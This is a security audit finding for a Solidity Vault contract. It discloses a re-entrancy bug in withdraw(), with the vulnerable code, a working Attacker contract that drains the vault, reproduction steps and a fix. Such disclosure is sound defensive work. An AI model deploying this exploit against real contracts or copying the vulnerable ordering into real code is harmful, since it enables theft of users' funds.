# Finding: Re-entrancy in `Vault.withdraw()` drains the contract balance

**Severity:** High
**Component:** `contracts/Vault.sol` — function `withdraw(uint256 amount)`
**Affected version:** commit `a1b2c3d` (the version deployed to testnet)

## Summary

`Vault.withdraw()` sends ETH to the caller **before** it decreases the caller's recorded balance.
That ordering lets a caller re-enter `withdraw()` from its `receive()` fallback and withdraw the
same balance repeatedly until the vault is empty.

## The vulnerable code

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "insufficient balance");

    // BUG: the external call happens before the state update
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "transfer failed");

    balances[msg.sender] -= amount;   // too late — the caller already re-entered
}
```

The state update `balances[msg.sender] -= amount` runs **after** the untrusted external call. During
that call, `balances[msg.sender]` still holds the original value, so the `require` at the top of the
function passes again.

## Mechanism of failure

1. Attacker deposits 1 ETH → `balances[attacker] = 1 ETH`.
2. Attacker calls `withdraw(1 ETH)`.
3. `Vault` executes `msg.sender.call{value: 1 ETH}("")`.
4. The attacker's `receive()` runs and calls `withdraw(1 ETH)` **again**.
5. At step 4 the balance has still not been decremented, so the check passes and another 1 ETH is
   sent.
6. Steps 4–5 repeat until the vault's balance is exhausted or gas runs out.

## Reproduction

A minimal proof of concept:

```solidity
contract Attacker {
    Vault vault;

    constructor(address target) { vault = Vault(target); }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);   // re-enter while the balance is still un-decremented
        }
    }
}
```

Steps to reproduce on a local fork:

1. Deploy `Vault` and fund it with 10 ETH from other users.
2. Deploy `Attacker` with the vault address.
3. Call `attacker.attack()` with 1 ETH.
4. Observe: `address(vault).balance` drops to 0 and `attacker` holds ~10 ETH.

This was reproduced locally against commit `a1b2c3d`; the vault was fully drained in a single
transaction.

## Recommended fix

Apply the checks-effects-interactions ordering, or add a re-entrancy guard:

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "insufficient balance");
    balances[msg.sender] -= amount;          // state first
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "transfer failed");
}
```

## Impact

Any depositor can drain the entire vault balance of all other users. This is a total loss of funds.
